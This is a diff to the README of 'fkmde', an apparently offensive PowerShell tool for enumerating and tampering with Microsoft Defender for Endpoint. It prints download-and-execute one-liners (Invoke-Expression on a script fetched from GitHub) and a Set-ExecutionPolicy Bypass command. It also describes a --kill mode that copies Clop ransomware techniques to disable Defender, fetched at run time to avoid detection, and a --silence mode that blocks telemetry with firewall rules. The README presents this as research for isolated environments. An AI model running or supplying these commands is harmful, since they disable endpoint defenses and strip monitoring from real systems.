@@ -22,6 +22,15 @@ fkmde.ps1 --kill <path>              # Specify a directory for the script to dow
 fkmde.ps1 --silence                  # Block MDE telemetry via firewall rules
 fkmde.ps1 --unsilence                # Remove silence firewall rules
 ```
+The script can also be run with and without parameterized modes directly from github.
+
+```powershell
+  // basic method with iex
+  Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1')
+
+  // parameterized mode with iex and irm
+  Invoke-Expression "& { $(Invoke-RestMethod https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1) } --enum C:\Windows 3"
+```
 
 - **`--kill` Parameter**  
   This parameter triggers a script that implements techniques similar to those used by Clop Ransomware to disable and evade Microsoft Defender. The script is not hardcoded into `fkmde`, but dynamically fetched from an external source to avoid pre-execution detection. This should be used *only* in secure, isolated environments for research purposes. It is possible to specify a custom directory using the optional <path> argument to download and run the kill script.
@@ -35,20 +44,8 @@ fkmde.ps1 --unsilence                # Remove silence firewall rules
 - **`--unsilence` Parameter**  
   Removes the firewall rules created by `--silence`.
   
-> [!NOTE]
-> Any scripts tampering with the defender are not directly embedded in `fkmde`. Instead, they are loaded dynamically to minimize detection by Defender for Endpoint when the tool is used solely for enumeration purposes.
 
-The script can also be run with and without parameterized modes directly from github.
-
-```powershell
-  // basic method with iex
-  Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1')
-
-  // parameterized mode with iex and irm
-  Invoke-Expression "& { $(Invoke-RestMethod https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1) } --enum C:\Windows 3"
-```
-
-> By default, the PowerShell [execution policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies) is set to `Restricted` on clients, and `RemoteSigned` on servers, when a new `powershell.exe` process is started. These policies block the execution of (unsigned) scripts, but they can be overriden within the current scope. However, this trick does not work when the execution policy is enforced through a GPO. In this case, after starting a new PowerShell session, you can load the script with the second command.
+By default, the PowerShell [execution policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies) is set to `Restricted` on clients, and `RemoteSigned` on servers, when a new `powershell.exe` process is started. These policies block the execution of (unsigned) scripts, but they can be overriden within the current scope. However, this trick does not work when the execution policy is enforced through a GPO. In this case, after starting a new PowerShell session, you can load the script with the second command.
 
 ```powershell
 Set-ExecutionPolicy Bypass -Scope Process -Force
